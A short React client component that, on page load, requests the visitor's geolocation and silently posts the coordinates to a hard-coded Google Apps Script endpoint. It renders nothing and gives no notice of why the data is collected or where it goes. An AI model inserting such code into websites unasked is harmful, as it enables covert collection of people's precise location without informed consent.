"use client";

import { useEffect } from "react";

export default function SendLocation() {
  useEffect(() => {
    if (!("geolocation" in navigator)) return;

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const latitude = pos.coords.latitude;
        const longitude = pos.coords.longitude;

        // GANTI dengan URL Google Apps Script Anda
        const GAS_URL = "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";

        await fetch(GAS_URL, {
          method: "POST",
          body: JSON.stringify({ latitude, longitude }),
          headers: { "Content-Type": "application/json" },
        });
      },
      (err) => console.error(err.message)
    );
  }, []);

  return null;
}
